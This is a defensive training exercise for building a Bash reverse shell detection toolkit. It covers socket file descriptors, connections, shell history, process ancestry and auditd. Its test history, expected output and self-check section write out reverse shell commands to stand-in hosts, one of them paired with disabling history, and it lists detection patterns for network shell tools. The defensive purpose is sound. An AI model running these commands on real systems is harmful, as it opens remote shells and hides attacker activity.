# Task 9: Reverse Shell Detection Script

## Objective
Build a comprehensive reverse shell detection toolkit. Write detection scripts that check for suspicious shell processes, unusual FDs pointing to sockets, and monitor outbound connections. Test detection methods against simulated (safe) patterns. Understand both the mechanism and the limitations of each detection technique.

**IMPORTANT:** This is a DEFENSE exercise. You will build detection tools, not attack tools. All patterns used for testing are simulated in isolated environments.

## Requirements

1. **Process audit:** Check all bash/sh/python/perl/ruby processes for socket file descriptors in `/proc/PID/fd/`
2. **Connection audit:** Use `ss` to list all established connections from shell processes
3. **History audit:** Scan `.bash_history` for reverse shell patterns
4. **Reporting:** Color-coded output (red for findings, green for clean), severity ratings (HIGH/MEDIUM/LOW)
5. **Stealth consideration:** In comments, note what attackers might do to evade each check
6. **Test harness:** Create safe test patterns that trigger each detection (without actual connections)
7. **Integration:** Combine all checks into a single scan with summarized findings
8. **False positive analysis:** Identify which patterns might cause false positives in production

## Sub-tasks (9 cumulative)

### Task 9.1: Process Scanner — Socket FD Detection

```bash
#!/bin/bash
# defensescanner.sh — Process component
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
SCORE=0

check_processes() {
  local shells=("bash" "sh" "python" "perl" "ruby" "lua" "php")
  local findings=0
  
  for shell in "${shells[@]}"; do
    for pid in $(pgrep -x "$shell" 2>/dev/null); do
      local comm=$(cat /proc/$pid/comm 2>/dev/null)
      local exe=$(readlink /proc/$pid/exe 2>/dev/null)
      
      for fd_path in /proc/$pid/fd/*; do
        local target=$(readlink "$fd_path" 2>/dev/null)
        if [[ "$target" == *socket:* ]]; then
          local inode="${target#*:}"
          echo -e "  ${RED}HIGH:${NC} Process $pid ($comm) has socket FD"
          echo "    FD: $(basename $fd_path) -> $target"
          echo "    Actual binary: $exe"
          echo "    Cmdline: $(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)"
          echo "    Evasion note: Process may be renamed with exec -a"
          ((findings++))
        fi
      done
    done
  done
  
  if [ "$findings" -eq 0 ]; then
    echo -e "  ${GREEN}PASS:${NC} No shell processes with socket FDs"
  fi
  return $findings
}
```

### Task 9.2: Network Connection Auditor

```bash
check_connections() {
  local findings=0
  local safe_ports=":80$|:443$|:53$|:22$|:123$"
  
  echo "[CHECK] Scanning outbound connections..."
  
  # Method A: Using ss
  ss -tupn 2>/dev/null | awk -v safe="$safe_ports" '
    NR>1 && /ESTAB/ {
      if($0 !~ safe) {
        print "  SUSPICIOUS: " $0
        findings++
      }
    }
    END { exit findings }
  ' || local ss_findings=$?
  
  # Method B: Using /proc/net/tcp (more reliable, always available)
  while IFS= read -r line; do
    [[ "$line" == "  sl"* ]] && continue
    local local_hex=$(echo "$line" | awk '{print $2}')
    local remote_hex=$(echo "$line" | awk '{print $3}')
    local state=$(echo "$line" | awk '{print $4}')
    
    # Convert hex IP to dotted decimal
    local ip_hex="${remote_hex%:*}"
    local port_hex="${remote_hex#*:}"
    local ip=$(printf "%d.%d.%d.%d" 0x${ip_hex:6:2} 0x${ip_hex:4:2} 0x${ip_hex:2:2} 0x${ip_hex:0:2})
    local port=$((16#$port_hex))
    
    # State 01 = ESTABLISHED
    if [[ "$state" == "01" ]] && [[ "$port" -lt 1024 ]] && [[ "$port" != 80 ]] && [[ "$port" != 443 ]]; then
      echo "  SUSPICIOUS: Connection to $ip:$port (low port, non-standard)"
      ((findings++))
    fi
  done < /proc/net/tcp
  
  if [ "$findings" -eq 0 ]; then
    echo -e "  ${GREEN}PASS:${NC} No suspicious outbound connections"
  fi
  return $findings
}
```

### Task 9.3: History Auditor

```bash
check_history() {
  local patterns=(
    '/dev/tcp/.*0>&1'
    'bash.*-i.*>&/dev'
    'nc.*-e.*/bin'
    'python.*socket.*connect'
    'perl.*IO::Socket'
    'ruby.*TCPSocket'
    'mknod.*/tmp/backpipe'
  )
  local findings=0
  
  echo "[CHECK] Scanning shell history..."
  
  for hist_file in /home/*/.bash_history /root/.bash_history; do
    [ -f "$hist_file" ] || continue
    local user=$(basename "$(dirname "$hist_file")")
    local user_findings=0
    
    for pattern in "${patterns[@]}"; do
      if grep -qE "$pattern" "$hist_file" 2>/dev/null; then
        echo -e "  ${RED}HIGH:${NC} User $user has matching pattern: $pattern"
        grep -E "$pattern" "$hist_file" | while read -r line; do
          echo "    Command: $line"
        done
        ((user_findings++))
      fi
    done
    
    if [ "$user_findings" -gt 0 ]; then
      echo "  Evasion note: Attackers can disable history (HISTFILE=/dev/null)"
      ((findings += user_findings))
    else
      echo -e "  ${GREEN}PASS:${NC} User $user — no suspicious history"
    fi
  done
  
  return $findings
}
```

### Task 9.4: Process Tree Auditor

```bash
check_process_trees() {
  echo "[CHECK] Analyzing process ancestry..."
  local findings=0
  
  for pid in $(pgrep -x bash sh dash 2>/dev/null); do
    local ppid=$(awk '/PPid/ {print $2}' /proc/$pid/status 2>/dev/null)
    local pcomm=$(cat /proc/$ppid/comm 2>/dev/null)
    
    case "$pcomm" in
      bash|sh|zsh|fish|login|sshd|tmux|screen|systemd|init|python*|perl|ruby)
        ;; # Known good parents
      *)
        echo -e "  ${YELLOW}MEDIUM:${NC} Shell PID $pid spawned by unusual parent: $pcomm (PID $ppid)"
        echo "    Chain: $(cat /proc/$pid/cmdline | tr '\0' ' ')"
        ((findings++))
        ;;
    esac
  done
  
  if [ "$findings" -eq 0 ]; then
    echo -e "  ${GREEN}PASS:${NC} All shell processes have expected parents"
  fi
  return $findings
}
```

### Task 9.5: Auditd Integration

```bash
setup_audit() {
  # Requires root
  if [ "$EUID" -ne 0 ]; then
    echo "Audit integration requires root. Skipping."
    return
  fi
  
  echo "[CHECK] Configuring auditd rules..."
  
  # Monitor connect syscalls from shell interpreters
  for shell in /bin/bash /bin/sh /usr/bin/python* /usr/bin/perl; do
    if [ -f "$shell" ]; then
      auditctl -a always,exit -F arch=b64 -S connect -F exe="$shell" \
        -F key="revshell_$shell" 2>/dev/null || true
    fi
  done
  
  echo "Audit rules active. Check: ausearch -k revshell_bash"
}
```

### Task 9.6: Safe Test Pattern Generation

Create test patterns that trigger detectors WITHOUT actual network connections:

```bash
generate_test_patterns() {
  local test_dir="/tmp/revshell_test"
  mkdir -p "$test_dir"
  
  # Test 1: Simulate socket FD (doesn't actually connect)
  cat > "$test_dir/test_socket_fd.sh" << 'SHIM'
#!/bin/bash
# SAFE TEST: Creates a socket FD using /dev/tcp to localhost
# Run ONLY if connected to nothing — this will fail harmlessly
exec 3<>/dev/tcp/127.0.0.1/1 2>/dev/null  # Will fail, no listener
ls -la /proc/$$/fd/  # Scanner sees FD 3 trying to be a socket
SHIM

  # Test 2: Simulate history pattern (writes to a test history)
  cat > "$test_dir/.bash_history_test" << 'SHIM'
ls -la
echo "test"
bash -i >& /dev/tcp/10.0.0.1/4443 0>&1
cd /tmp
SHIM
  
  # Test 3: Simulate suspicious parent
  cat > "$test_dir/test_parent.sh" << 'SHIM'
#!/bin/bash
# Simulate a shell spawned by an unusual parent
# Run from cron or another non-shell parent for testing
sleep 5  # Gives time to scan
SHIM
  
  echo "Test patterns generated in $test_dir"
  echo "WARNING: Do not run test_socket_fd.sh on production systems"
}
```

### Task 9.7: Scoring and Reporting

```bash
generate_report() {
  local high=$1 medium=$2 low=$3
  local total=$((high + medium + low))
  
  echo
  echo "============================================"
  echo "        REVERSE SHELL DETECTION REPORT       "
  echo "============================================"
  echo "Timestamp: $(date)"
  echo "Host: $(hostname)"
  echo
  echo "Findings Summary:"
  echo -e "  ${RED}HIGH:   $high${NC}"
  echo -e "  ${YELLOW}MEDIUM: $medium${NC}"
  echo -e "  ${GREEN}LOW:    $low${NC}"
  echo "  Total:  $total"
  echo
  
  if [ "$total" -eq 0 ]; then
    echo -e "${GREEN}System appears clean.${NC}"
  else
    echo -e "${RED}Investigate findings above.${NC}"
  fi
  
  echo "============================================"
}
```

### Task 9.8: Integration Script

```bash
#!/bin/bash
# revshell_audit.sh — Complete reverse shell detection suite

main() {
  local high=0 medium=0 low=0
  
  echo "=== Reverse Shell Detection Audit ==="
  echo "Starting scan at $(date)..."
  echo
  
  check_processes; ((high += $?))
  check_connections; ((medium += $?))
  check_history; ((high += $?))
  check_process_trees; ((medium += $?))
  check_filesystem_watch
  
  generate_report $high $medium $low
}

main "$@"
```

### Task 9.9: False Positive Analysis

Create a document analyzing which patterns might trigger false alarms:

```
False Positive Analysis:

1. Socket FDs in bash:
   - FP: Scripts that intentionally use sockets (e.g., monitoring tools)
   - Mitigation: Whitelist known-safe scripts by command path

2. Outbound connections:
   - FP: Package managers (apt, yum), update checkers
   - Mitigation: Correlate with package manager processes

3. History patterns:
   - FP: CTF challenges, security research, educational materials
   - Mitigation: Check context (frequency, associated files)

4. Process tree anomalies:
   - FP: Docker entrypoint scripts, container init processes
   - Mitigation: Learn normal patterns for each system

5. Socket creation:
   - FP: Legitimate network services running under bash (rare)
   - Mitigation: Verify service legitimacy
```

## Bonus Challenges

1. **Bonus A:** Build a real-time monitor using `inotifywait` on `/proc/*/fd/` that alerts immediately when a shell process opens a socket.

2. **Bonus B:** Create a systemd service that runs the detection scan periodically and sends results to syslog.

3. **Bonus C:** Implement ML-based detection — use word2vec on command-line arguments to detect anomalous shell invocations.

4. **Bonus D:** Build a "canary" — a process that intentionally leaves a reverse-shell-like pattern and alerts when the detector catches it (tests your own detection).

5. **Bonus E:** Create an automated response script that kills shell processes with socket FDs (after manual confirmation).

## Hints

<details>
<summary>Hint 1: /proc/PID/fd/ structure</summary>

Socket FDs in /proc/PID/fd/ appear as `socket:[inode_number]`. Parse the inode and match it against `/proc/net/tcp` to find the remote endpoint.
</details>

<details>
<summary>Hint 2: ss vs netstat</summary>

`ss` is faster and more modern than `netstat`. Use `ss -tupn` for TCP, UDP, PID info, numeric ports.
</details>

<details>
<summary>Hint 3: Process comm vs exe</summary>

`/proc/PID/comm` shows the process name (easily faked with `exec -a`). `/proc/PID/exe` is a symlink to the actual binary (hard to fake). Always check `/proc/PID/exe`.
</details>

<details>
<summary>Hint 4: History manipulation</summary>

Attackers can disable history with `set +o history` or write to a custom `HISTFILE`. An EMPTY history file after a long session is itself suspicious.
</details>

<details>
<summary>Hint 5: Color output in scripts</summary>

Use ANSI escape codes: `RED='\033[0;31m'`, `NC='\033[0m'`. Use `echo -e` to interpret escapes.
</details>

## Expected Output

```bash
$ sudo ./revshell_audit.sh
=== Reverse Shell Detection Audit ===
Starting scan at Mon Jul 31 10:00:00 UTC 2026...

[CHECK 1] Processes with socket FDs...
  HIGH: Process 1234 (bash) has socket FD
    FD: 3 -> socket:[67890]
    Actual binary: /usr/bin/bash
    Cmdline: bash -c exec 3<>/dev/tcp/10.0.0.5/4443
    Remote: 10.0.0.5:4443

[CHECK 2] Outbound connections...
  SUSPICIOUS: bash (PID 1234) connected to 10.0.0.5:4443

[CHECK 3] Shell history analysis...
  HIGH: User bob has matching pattern: /dev/tcp/.*0>&1
    Command: bash -i >& /dev/tcp/10.0.0.5/4443 0>&1

[CHECK 4] Process tree analysis...
  MEDIUM: Shell PID 5678 spawned by unusual parent: nginx (PID 9001)
    Chain: /bin/bash -c echo "hello"

============================================
        REVERSE SHELL DETECTION REPORT
============================================
Timestamp: Mon Jul 31 10:00:00 UTC 2026
Host: server01.example.com

Findings Summary:
  HIGH:   2
  MEDIUM: 1
  LOW:    0
  Total:  3

Investigate findings above.
============================================
```

## Deep Self-Check

1. **Process name spoofing test:** Run `exec -a httpd bash -c 'sleep 30'` in one terminal. In another, run your detection script. Does it still detect the process? What field reveals the true identity?

2. **History bypass test:** In a shell, run `unset HISTFILE; set +o history; bash -i >& /dev/tcp/127.0.0.1/9999 2>&1`. Check if this appears in history. How would you detect this activity without history?

3. **auditd test:** Configure auditd to monitor connect syscalls from bash. Run a test pattern. Use `ausearch` to retrieve the record. What does the audit record contain?

4. **False positive study:** Run the detector on a normal system. How many findings appear? Which are legitimate? Document the whitelist you'd create.

5. **Evasive payload analysis:** Research how a reverse shell using only `curl` or `wget` would work (periodic polling to a web server). How would your detection need to change to catch this?

6. **Network namespace escape:** In a Docker container, run the detection script. Can it see host processes? What does this imply for detection in containerized environments?

7. **Time-based evasion:** Create a reverse shell that connects for 1 second every 60 seconds. How often must your scanner run to catch it with 95% confidence?

8. **Detection race condition:** If your detection script takes 2 seconds to run, and the reverse shell only exists for 1 second, what's the probability of detection? How would you fix this?

9. **Fileless payload:** Research how a reverse shell that never touches disk works (e.g., from a web shell or in-memory PHP execution). What artifacts does it leave?

10. **Correlation with authentication logs:** Cross-reference suspicious shell PIDs with `/var/log/auth.log` login times. Does every reverse shell correlate with a login event?
